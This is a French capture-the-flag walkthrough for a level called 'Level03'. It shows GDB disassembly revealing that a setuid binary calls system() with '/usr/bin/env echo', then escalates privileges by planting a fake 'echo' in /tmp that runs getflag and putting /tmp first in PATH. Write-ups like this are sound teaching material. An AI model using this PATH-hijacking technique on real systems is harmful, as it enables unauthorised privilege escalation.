# Level03

Qui suis-je? Ou suis-je?

	$ ls -la
	-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

	$ file level03
	(binary file with setuid setgid)

	$ ./level03
	Exploit me

On va analyser le programme avec GDB

	$ gdb level03

	$ (gdb) disas main
	...
	0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
	0x080484fe <+90>:	call   0x80483b0 <system@plt>
	...

	$ (gdb) x/s 0x80485e0
	0x80485e0:	 "/usr/bin/env echo Exploit me"

On voit que la fonction system est appelée avec le parametre "/usr/bin/env echo Exploit me"

Il va falloir creer un 'faux' echo qui va en fait executer getflag

	$ echo "/bin/sh -c 'getflag'" > /tmp/echo

	$ ls -l /tmp/echo
	-rw-rw-r-- 1 level03 level03 21 Nov 27 19:44 /tmp/echo
	(On a eu les droits)

	$ chmod 755 /tmp/echo

Puis ajouter /tmp dans le PATH en premier pour que le systeme le trouve dedans

	$ export PATH=/tmp:$PATH

Et enfin lancer le binaire

	$ ./level03
	Check flag.Here is your token : XXXXXXXXXXXXXXXXXXX

:checkered_flag:
